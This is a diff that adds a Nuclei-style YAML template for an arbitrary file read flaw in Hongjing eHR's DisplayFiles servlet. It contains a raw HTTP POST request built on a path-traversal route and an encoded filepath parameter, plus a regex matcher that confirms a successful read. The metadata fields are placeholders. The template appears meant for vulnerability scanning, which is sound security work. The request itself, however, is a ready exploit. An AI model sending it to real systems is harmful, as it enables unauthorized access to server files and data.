@@ -1,0 +1,28 @@
+id: hongjing-HCM-DisplayFiles-fileread
+
+info:
+  name: 宏景eHR DisplayFiles 任意文件读取漏
+  author: mhb17
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: fileread
+
+requests:
+  - raw:
+      - |+
+        POST /templates/attestation/../../servlet/DisplayFiles HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-type: application/x-www-form-urlencoded
+        Content-Length: 86
+        Connection: close
+
+        filepath=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "bit app support"
